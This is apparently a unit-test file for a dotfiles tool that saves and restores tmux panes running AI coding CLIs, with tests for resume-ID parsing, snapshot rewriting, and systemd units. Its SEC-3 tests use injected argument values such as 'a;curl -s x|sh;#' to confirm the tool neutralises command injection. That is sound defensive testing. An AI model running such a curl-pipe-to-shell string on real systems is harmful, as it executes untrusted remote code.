"""Unit tests for tmux/resurrect-ai-session.py and the portable restore files."""

from __future__ import annotations

import importlib.util
import json
import re
import stat
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

REPO_ROOT = Path(__file__).resolve().parents[2]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

SCRIPT = REPO_ROOT / "tmux/resurrect-ai-session.py"
SPEC = importlib.util.spec_from_file_location("resurrect_ai_session", SCRIPT)
assert SPEC is not None and SPEC.loader is not None
MODULE = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(MODULE)


ID_A = "11111111-2222-4333-8444-555555555555"
ID_B = "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee"


def pane_line(command="zsh", full=":zsh"):
    return "\t".join((
        "pane", "work", "2", "1", "-", "5", "title", "/tmp", "1",
        command, full,
    )) + "\n"


class ParserTests(unittest.TestCase):
    def test_codex_parser_is_explicit_and_fail_closed(self):
        self.assertEqual(
            MODULE.codex_resume_id([
                "/usr/bin/codex", "--model", "gpt", "resume", ID_A,
                "--disable", "hooks",
            ]),
            ID_A,
        )
        self.assertIsNone(MODULE.codex_resume_id([
            "codex", "--unknown", "resume", ID_A,
        ]))
        self.assertIsNone(MODULE.codex_resume_id([
            "codex", "-m", "resume", ID_A,
        ]))

    def test_claude_parser_rejects_ambiguous_resume_ids(self):
        self.assertEqual(
            MODULE.claude_resume_id(["claude", "--resume", ID_A]), ID_A
        )
        self.assertIsNone(MODULE.claude_resume_id([
            "claude", "-r", ID_A, "--resume", ID_B,
        ]))
        self.assertIsNone(MODULE.claude_resume_id([
            "claude", "--", "--resume", ID_A,
        ]))

    def test_claude_flags_are_narrow_and_safe(self):
        self.assertEqual(
            MODULE.safe_claude_flags([
                "claude", "--model", "opus[1m]", "--effort", "max",
                "--permission-mode", "bypassPermissions", "--name", "task-1",
            ]),
            ["--model", "opus[1m]", "--effort", "max", "--name", "task-1"],
        )
        self.assertEqual(
            MODULE.safe_claude_flags(["claude", "--name", "bad name"]), []
        )


class IdentityTests(unittest.TestCase):
    def test_dict_metadata_source_is_handled_without_guessing(self):
        self.assertFalse(MODULE.metadata_is_root({"source": {"other": "value"}}))

    def test_claude_command_uses_canonical_binary_and_unique_id(self):
        processes = [(20, 2, ["/tmp/claude", "--model", "opus", "-r", ID_A])]
        with mock.patch.object(MODULE, "process_tree", return_value=processes), \
             mock.patch.object(MODULE, "claude_metadata_id", return_value=None), \
             mock.patch.object(MODULE.shutil, "which", return_value=None):
            command = MODULE.ai_resume_command(10)
        self.assertEqual(command, [
            str(Path.home() / ".local/bin/claude"),
            "--model", "opus", "--resume", ID_A,
        ])

    def test_claude_launcher_is_resolved_on_path_at_save_time(self):
        processes = [(20, 2, ["claude", "--resume", ID_A])]
        with mock.patch.object(MODULE, "process_tree", return_value=processes), \
             mock.patch.object(MODULE, "claude_metadata_id", return_value=None), \
             mock.patch.object(
                 MODULE.shutil, "which", return_value="/opt/ai/bin/claude"
             ):
            command = MODULE.ai_resume_command(10)
        self.assertEqual(command, ["/opt/ai/bin/claude", "--resume", ID_A])

    def test_relative_path_lookup_falls_back_to_user_launcher(self):
        with mock.patch.object(MODULE.shutil, "which", return_value="bin/claude"):
            self.assertEqual(
                MODULE.claude_executable(),
                str(Path.home() / ".local/bin/claude"),
            )

    def test_multiple_live_ai_ids_are_unresolved(self):
        processes = [
            (20, 2, ["claude", "--resume", ID_A]),
            (21, 3, ["claude", "--resume", ID_B]),
        ]
        with mock.patch.object(MODULE, "process_tree", return_value=processes), \
             mock.patch.object(MODULE, "claude_metadata_id", return_value=None):
            self.assertEqual(MODULE.ai_resume_command(10), [])

    def codex_command(self, argv, locks, roots):
        with mock.patch.object(
            MODULE, "process_tree", return_value=[(20, 2, argv)]
        ), mock.patch.object(
            MODULE, "open_codex_ids", return_value=(locks, [])
        ) as open_ids, mock.patch.object(
            MODULE, "session_metadata",
            side_effect=lambda value, _: (
                {"id": value, "thread_source": "user"} if value in roots
                else None
            ),
        ):
            command = MODULE.ai_resume_command(10)
        self.assertEqual(open_ids.call_count, 1)
        return command

    def test_codex_live_thread_wins_over_stale_resume_argv(self):
        # REQ-2: /new or /resume inside the TUI leaves argv at the old ID.
        self.assertEqual(
            self.codex_command(["codex", "resume", ID_A], [ID_B], {ID_B}),
            ["codex", "resume", ID_B],
        )
        self.assertEqual(
            self.codex_command(["codex", "resume", ID_A], [ID_A], {ID_A}),
            ["codex", "resume", ID_A],
        )

    def test_codex_argv_id_needs_uncontradicted_evidence(self):
        # No live evidence at all: the explicit argv ID stands.
        self.assertEqual(
            self.codex_command(["codex", "resume", ID_A], [], set()),
            ["codex", "resume", ID_A],
        )
        # Only the same ID, unverified: still agrees.
        self.assertEqual(
            self.codex_command(["codex", "resume", ID_A], [ID_A], set()),
            ["codex", "resume", ID_A],
        )
        # A different unverified live ID, or two roots: unresolved.
        self.assertEqual(
            self.codex_command(["codex", "resume", ID_A], [ID_B], set()), []
        )
        self.assertEqual(
            self.codex_command(["codex", "resume", ID_A], [ID_A, ID_B], {ID_A, ID_B}),
            [],
        )

    def test_codex_hooks_flag_follows_the_process_to_the_live_thread(self):
        self.assertEqual(
            self.codex_command(
                ["codex", "resume", ID_A, "--disable", "hooks"], [ID_B], {ID_B}
            ),
            ["codex", "resume", ID_B, "--disable", "hooks"],
        )

    def test_codex_open_ids_require_one_metadata_verified_root(self):
        processes = [(20, 2, ["codex"])]
        with mock.patch.object(MODULE, "process_tree", return_value=processes), \
             mock.patch.object(
                 MODULE, "open_codex_ids",
                 return_value=([ID_A, ID_B], []),
             ), mock.patch.object(
                 MODULE, "session_metadata",
                 side_effect=lambda value, _: {
                     "id": value,
                     "thread_source": "user" if value == ID_A else "subagent",
                 },
             ):
            self.assertEqual(
                MODULE.ai_resume_command(10), ["codex", "resume", ID_A]
            )


class RewriteTests(unittest.TestCase):
    def setUp(self):
        self.panes = {("work", "2", "5"): 123}

    def enrich(self, line, children):
        return MODULE.enrich_state(
            [line], self.panes, lambda _: None, lambda _: children
        )[0]

    def test_ordinary_command_is_byte_for_byte_intact(self):
        line = pane_line("ssh", ":ssh host -- unusual")
        self.assertEqual(
            self.enrich(line, [["ssh", "host", "--", "unusual"]]), line
        )
        shell = pane_line("zsh", ":")
        self.assertEqual(self.enrich(shell, []), shell)

    def test_ordinary_command_is_requoted_from_live_argv(self):
        # SEC-3: resurrect's ps strategy joins argv with spaces, and a restore
        # types the text into the pane's shell.
        line = pane_line("tail", ":tail -f a;curl -s x|sh;#")
        rewritten = self.enrich(line, [["tail", "-f", "a;curl -s x|sh;#"]])
        self.assertTrue(rewritten.endswith("\t:tail -f 'a;curl -s x|sh;#'\n"))
        self.assertEqual(
            MODULE.shlex.split(rewritten.rstrip("\n").split("\t")[10][1:]),
            ["tail", "-f", "a;curl -s x|sh;#"],
        )

    def test_unproven_ordinary_command_is_cleared(self):
        line = pane_line("vim", ":vim a;touch X")
        # No live child with that exact command line (e.g. already exited).
        self.assertTrue(self.enrich(line, []).endswith("\t:\n"))
        self.assertTrue(
            self.enrich(line, [["vim", "b"]]).endswith("\t:\n")
        )
        # Two different children that print the same text: ambiguous.
        self.assertTrue(self.enrich(
            line, [["vim", "a;touch", "X"], ["vim", "a;touch X"]]
        ).endswith("\t:\n"))
        # Arguments that cannot be typed back safely.
        for bad in ("a\u0007b", "a\u001bb", "a\ufffdb"):
            with self.subTest(bad=bad):
                self.assertTrue(self.enrich(
                    pane_line("vim", f":vim {bad}"), [["vim", bad]]
                ).endswith("\t:\n"))

    def test_child_commands_reads_direct_children_only(self):
        import os
        import subprocess
        child = subprocess.Popen(
            [sys.executable, "-c", "import time; time.sleep(30)", "x;y"]
        )
        try:
            commands = MODULE.child_commands(os.getpid())
            self.assertIn(
                [sys.executable, "-c", "import time; time.sleep(30)", "x;y"],
                commands,
            )
            self.assertEqual(MODULE.child_commands(child.pid), [])
        finally:
            child.kill()
            child.wait()

    def test_resolved_and_unresolved_ai_are_rewritten(self):
        resolved = MODULE.enrich_state(
            [pane_line("zsh", ":stale arbitrary command")],
            self.panes,
            lambda _: ["codex", "resume", ID_A],
        )[0]
        self.assertTrue(resolved.endswith(f":codex resume {ID_A}\n"))

        unresolved = MODULE.enrich_state(
            [pane_line("zsh", ":codex --last")], self.panes, lambda _: []
        )[0]
        self.assertTrue(unresolved.endswith("\t:\n"))

        hidden = MODULE.enrich_state(
            [pane_line("zsh", ":zsh -lc '/opt/ai/bin/claude --last'")],
            self.panes,
            lambda _: None,
            lambda _: [["zsh", "-lc", "'/opt/ai/bin/claude", "--last'"]],
        )[0]
        self.assertTrue(hidden.endswith("\t:\n"))

    def test_missing_or_duplicate_match_fails(self):
        with self.assertRaisesRegex(RuntimeError, "not live"):
            MODULE.enrich_state([pane_line()], {}, lambda _: None)
        with self.assertRaisesRegex(RuntimeError, "duplicate snapshot"):
            MODULE.enrich_state(
                [pane_line(), pane_line()], self.panes, lambda _: None
            )

    def test_run_is_atomic_mode_600_and_marks_only_success(self):
        with tempfile.TemporaryDirectory() as directory:
            state = Path(directory) / "last"
            state.write_text(pane_line("zsh", ":old"))
            marker = Path(str(state) + ".ai-ok")
            marker.write_text("stale\n")
            with mock.patch.object(MODULE, "live_panes", return_value=self.panes), \
                 mock.patch.object(
                     MODULE, "ai_resume_command",
                     return_value=["codex", "resume", ID_A],
                 ):
                MODULE.run(state)
            self.assertEqual(stat.S_IMODE(state.stat().st_mode), 0o600)
            self.assertEqual(stat.S_IMODE(marker.stat().st_mode), 0o600)
            self.assertEqual(marker.read_text(), "last\n")

            marker.write_text("stale\n")
            with mock.patch.object(MODULE, "live_panes", return_value={}):
                with self.assertRaises(RuntimeError):
                    MODULE.run(state)
            self.assertFalse(marker.exists())

    def test_unique_marker_path_from_environment(self):
        with tempfile.TemporaryDirectory() as directory:
            state = Path(directory) / "snapshot"
            marker = Path(directory) / "hook-marker"
            state.write_text(pane_line())
            with mock.patch.dict(
                "os.environ", {"TMUX_RESURRECT_HOOK_OK": str(marker)}
            ), mock.patch.object(
                MODULE, "live_panes", return_value=self.panes
            ), mock.patch.object(MODULE, "ai_resume_command", return_value=None), \
                 mock.patch.object(MODULE, "child_commands", return_value=[]):
                MODULE.run(state)
            self.assertEqual(marker.read_text(), "snapshot\n")
            self.assertFalse(Path(str(state) + ".ai-ok").exists())



SOURCE_USER_PATH = re.compile(r"/home/[A-Za-z0-9_.-]+|/Users/[A-Za-z0-9_.-]+")
RESTORE_FILES = (
    "tmux/tmux.conf",
    "tmux/resurrect.conf",
    "tmux/resurrect-save",
    "tmux/resurrect-ai-session.py",
    "systemd/user/tmux.service",
    "systemd/user/tmux-resurrect-autosave.service",
    "systemd/user/tmux-resurrect-autosave.timer",
    "manifests/tmux-plugins.json",
    "docs/tmux-auto-restore.ko.md",
)


# PLAT-1: the installer's tools directory (fd shim, fzf-preview.sh) first, as
# zsh/zshenv orders it, then the user and system bin directories.
UNIT_PATH = (
    "PATH=%h/.local/share/personal-dotfiles/bin:%h/.local/bin:"
    "/usr/local/bin:/usr/bin:/bin"
)


def unit_values(path: Path) -> dict[str, list[str]]:
    values: dict[str, list[str]] = {}
    for line in path.read_text(encoding="utf-8").splitlines():
        if not line or line.startswith(("#", ";", "[")):
            continue
        key, _, value = line.partition("=")
        values.setdefault(key.strip(), []).append(value.strip())
    return values


class PortableFilesTests(unittest.TestCase):
    def test_no_machine_specific_home_paths(self):
        for name in RESTORE_FILES:
            with self.subTest(name=name):
                text = (REPO_ROOT / name).read_text(encoding="utf-8")
                self.assertIsNone(SOURCE_USER_PATH.search(text))
                self.assertNotIn("DISPLAY=:0", text)
                # Generic reasons only; nothing about one machine's private setup.
                self.assertNotRegex(text.lower(), r"sidebar|workspace restore app")

    def test_scripts_are_executable(self):
        for name in ("tmux/resurrect-save", "tmux/resurrect-ai-session.py"):
            mode = (REPO_ROOT / name).stat().st_mode
            self.assertTrue(mode & stat.S_IXUSR, name)

    def test_login_unit_is_static_and_graphical(self):
        values = unit_values(REPO_ROOT / "systemd/user/tmux.service")
        # PLAT-2/REQ-3: after the desktop has exported WAYLAND_DISPLAY/DISPLAY
        # (graphical-session.target), not merely after graphical-session-pre.
        after = " ".join(values["After"]).split()
        self.assertIn("graphical-session.target", after)
        self.assertEqual(values["WantedBy"], ["graphical-session.target"])
        # Logging out of the desktop does not stop the server.
        self.assertNotIn("PartOf", values)
        self.assertNotIn("BindsTo", values)
        self.assertEqual(values["Environment"], [UNIT_PATH])
        tools = json.loads(
            (REPO_ROOT / "manifests/tools.json").read_text(encoding="utf-8")
        )
        self.assertIn(
            tools["bin_dir"].replace("{data_home}", "%h/.local/share"),
            UNIT_PATH.split("=", 1)[1].split(":"),
        )
        self.assertEqual(values["UnsetEnvironment"], ["TMUX TMUX_PANE"])
        self.assertIn("! tmux has-session", values["ExecCondition"][0])
        self.assertTrue(values["ExecStart"][0].startswith("/usr/bin/env tmux "))
        self.assertIn("__continuum_startup", values["ExecStart"][0])
        self.assertEqual(values["ExecStop"], [
            "-%h/.dotfiles/tmux/resurrect-save",
            "-/usr/bin/env tmux kill-server",
        ])

    def test_autosave_timer_runs_the_wrapper_every_minute(self):
        service = unit_values(
            REPO_ROOT / "systemd/user/tmux-resurrect-autosave.service"
        )
        timer = unit_values(REPO_ROOT / "systemd/user/tmux-resurrect-autosave.timer")
        self.assertEqual(service["ExecStart"], ["%h/.dotfiles/tmux/resurrect-save"])
        self.assertEqual(service["ExecCondition"], ["/usr/bin/env tmux has-session"])
        self.assertEqual(service["Environment"], [UNIT_PATH])
        # resurrect-save's "not restored yet" skip is not a unit failure.
        self.assertEqual(service["SuccessExitStatus"], ["75"])
        skip = re.search(
            r"^SKIPPED=(\d+)$",
            (REPO_ROOT / "tmux/resurrect-save").read_text(encoding="utf-8"),
            re.MULTILINE,
        )
        self.assertIsNotNone(skip)
        self.assertEqual(skip.group(1), "75")
        self.assertEqual(timer["OnUnitActiveSec"], ["1min"])
        self.assertEqual(timer["Unit"], ["tmux-resurrect-autosave.service"])
        self.assertEqual(timer["WantedBy"], ["timers.target"])

    def test_plugin_manifest_pins_every_declared_plugin(self):
        data = json.loads(
            (REPO_ROOT / "manifests/tmux-plugins.json").read_text(encoding="utf-8")
        )
        self.assertEqual(data["schema"], 1)
        names = [plugin["name"] for plugin in data["plugins"]]
        self.assertEqual(len(names), len(set(names)))
        for plugin in data["plugins"]:
            self.assertRegex(plugin["commit"], r"^[0-9a-f]{40}$")
            self.assertTrue(plugin["url"].startswith("https://github.com/"))
            self.assertEqual(plugin["url"].rstrip("/").rsplit("/", 1)[1], plugin["name"])
        declared = set()
        for name in ("tmux/tmux.conf", "tmux/resurrect.conf"):
            text = (REPO_ROOT / name).read_text(encoding="utf-8")
            declared.update(re.findall(
                r"^\s*set(?:-option)?\s+-g\s+@plugin\s+['\"]?[^/'\"\s]+/([^'\"\s]+)",
                text, re.MULTILINE,
            ))
        self.assertLessEqual(declared, set(names))


if __name__ == "__main__":
    unittest.main()
